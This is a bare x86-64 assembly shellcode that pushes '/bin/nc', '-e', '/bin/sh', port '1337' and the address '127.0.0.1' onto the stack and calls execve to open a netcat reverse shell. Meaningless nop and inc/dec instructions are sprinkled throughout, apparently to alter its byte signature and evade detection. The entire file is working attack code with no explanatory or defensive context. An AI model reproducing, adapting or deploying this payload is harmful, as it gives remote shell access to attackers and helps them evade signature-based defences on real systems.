global _start

_start:

xor    	rdx,rdx
nop
nop
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
dec al
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
dec al


push 	rcx
inc cl
dec cl
mov	rcx,rsp

mov     rbx,0x652dffffffffffff
std
cwd
shr	rbx,0x30

cmc

push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr 	r10,0x20
std
push 	r10
mov	r10,rsp

jmp short ip
continue:
pop 	r9

push	rdx  ;push NULL

push 	rcx  ;push address of 'bin/sh'
nop
inc dl
dec dl

push	rbx  ;push address of '-e'
inc cl
dec cl
nop
push	r10  ;push address of '1337'

dec al

push	r9   ;push address of 'ip'

inc bl
dec bl

push 	rdi  ;push address of '/bin/nc'

nop
mov    	rsi,rsp
mov al, 59

syscall

ip:
	call  continue
	db "127.0.0.1"
